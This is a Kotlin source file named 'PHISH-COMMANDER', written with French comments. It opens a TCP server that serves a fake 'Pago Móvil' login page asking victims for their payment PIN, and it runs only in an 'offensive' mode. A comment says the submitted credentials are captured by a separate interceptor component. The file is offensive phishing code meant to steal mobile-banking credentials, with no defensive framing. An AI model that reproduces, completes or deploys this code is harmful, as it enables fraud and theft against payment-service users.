package com.fardc.sigint.core

import java.net.ServerSocket
import java.io.PrintWriter

/**
 * PHISH-COMMANDER v8.1 (Purified)
 * Standard: Standalone Military Grade
 * Vecteur: Interception de crédentials via serveur TCP natif
 */
class PhishCommander(private val logger: BlackBox, private val brain: StateMachine) {

    fun deployVector(port: Int) {
        if (brain.mode != "OFFENSIF") {
            logger.recordIncident("PHISH_ERR", "Déploiement refusé : Mode non-offensif.")
            return
        }

        Thread {
            try {
                val server = ServerSocket(port)
                logger.recordIncident("PHISH_INIT", "Vecteur Pago Móvil actif sur port $port")
                
                while (true) {
                    val client = server.accept()
                    handleInteraction(client)
                }
            } catch (e: Exception) {
                logger.recordIncident("PHISH_CRIT", e.message ?: "Socket Error")
            }
        }.start()
    }

    private fun handleInteraction(socket: java.net.Socket) {
        val out = PrintWriter(socket.getOutputStream(), true)
        
        // Envoi d'une interface HTML minimaliste et rapide (Standard Militaire)
        out.println("HTTP/1.1 200 OK")
        out.println("Content-Type: text/html")
        out.println("")
        out.println("<html><body><h2>ACCESO PAGO MOVIL</h2>")
        out.println("<form method='POST'><input name='pin' type='password'><input type='submit'></form>")
        out.println("</body></html>")
        
        // Note: La capture réelle des données POST se fait via le ProxyInterceptor 
        // déjà présent dans le noyau, évitant la redondance de code.
        socket.close()
    }
}
